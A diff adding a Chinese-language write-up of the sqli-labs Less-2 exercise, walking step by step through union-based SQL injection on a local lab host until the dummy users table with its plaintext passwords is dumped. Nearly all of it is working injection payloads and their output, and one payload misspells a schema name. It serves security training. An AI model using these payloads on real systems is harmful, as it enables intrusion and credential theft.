@@ -1,0 +1,25 @@
+<hr>
+<h2 id="title-less2url-https-www-yuque-com-u29002979-ep2zrx-dady2k5mu2i7rd98"><a href="#title-less2url-https-www-yuque-com-u29002979-ep2zrx-dady2k5mu2i7rd98" class="headerlink" title="title: less2url: https://www.yuque.com/u29002979/ep2zrx/dady2k5mu2i7rd98"></a>title: less2<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/dady2k5mu2i7rd98">https://www.yuque.com/u29002979/ep2zrx/dady2k5mu2i7rd98</a></h2><p><a name="YstTA"></a></p>
+<h1 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h1><pre><code class="bash">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+</code></pre>
+<p>查看源码，参数没有闭合，说明为数字型注入。</p>
+<p><a name="t0fo6"></a></p>
+<h1 id="找注入点"><a href="#找注入点" class="headerlink" title="找注入点"></a>找注入点</h1><blockquote>
+<p><a href="http://192.168.31.193/Less-2/">http://192.168.31.193/Less-2/</a></p>
+</blockquote>
+<p>Please input the ID as parameter with numeric value&amp;#x20;<br>请输入ID作为带数值的参数<br><code>?id=1 and 1=2 #</code><br>1&#x3D;2非真，页面就没有显示内容，说明数据被执行了。 <a name="FFdxf"></a></p>
+<h1 id="判断字段"><a href="#判断字段" class="headerlink" title="判断字段"></a>判断字段</h1><p><code>?id=1 order by 4#</code><br>Unknown column ‘4’ in ‘order clause’<br>“order子句”中的未知列“4”<br><code>?id=1 order by 3#</code><br>显示正常，说明有三列。 <a name="VgMOQ"></a></p>
+<h1 id="找回显点"><a href="#找回显点" class="headerlink" title="找回显点"></a>找回显点</h1><p><code>?id=-1 union select 1,2,3#</code><br>显示了2，3，说明2，3是回显点</p>
+<p><a name="RnFWy"></a></p>
+<h1 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h1><p><a name="NpH7F"></a></p>
+<h2 id="查看数据库名"><a href="#查看数据库名" class="headerlink" title="查看数据库名"></a>查看数据库名</h2><p><code>?id=-1 union select 1,2,group_concat(schema_name) from informaion_schema.schemata #</code></p>
+<blockquote>
+<p>schema的复数:schemata</p>
+</blockquote>
+<p>显示了数据库名称：<br>information_schema,<br>challenges,<br>dvwa_com,<br>mysql,<br>performance_schema,<br>security,<br>sql,<br>sys <a name="oQxjF"></a></p>
+<h2 id="查看数据表名称"><a href="#查看数据表名称" class="headerlink" title="查看数据表名称"></a>查看数据表名称</h2><p><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p>
+<blockquote>
+<p>where table_schema&#x3D;database()：查到本数据库的所有表名</p>
+</blockquote>
+<p>显示数据表名称：<br>emails,<br>referers,<br>uagents,<br>users<br>查看users表字段名称<br><code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;#</code><br>显示字段名：<br>user_id,<br>first_name,<br>last_name,<br>user,<br>password,<br>avatar,<br>last_login,<br>failed_login,<br>USER,<br>CURRENT_CONNECTIONS,<br>TOTAL_CONNECTIONS,<br>id,<br>username,<br>password <a name="GOQCD"></a></p>
+<h2 id="查看字段内容"><a href="#查看字段内容" class="headerlink" title="查看字段内容"></a>查看字段内容</h2><p><code>?id=-1 union select 1,2,(select group_concat(username,0x7e,password) from users)#</code><br>用户名<del>密码<br>Dumb</del>Dumb,<br>Angelina<del>I kill-you,<br>Dummy</del>p@ssword,<br>secure<del>crappy,<br>stupid</del>stupidity,<br>superman<del>genious,<br>batman</del>mob!le,<br>admin<del>admin,<br>admin1</del>admin1,<br>admin2<del>admin2,<br>admin3</del>admin3,<br>dhakkan<del>dumbo,<br>admin4</del>admin4</p>
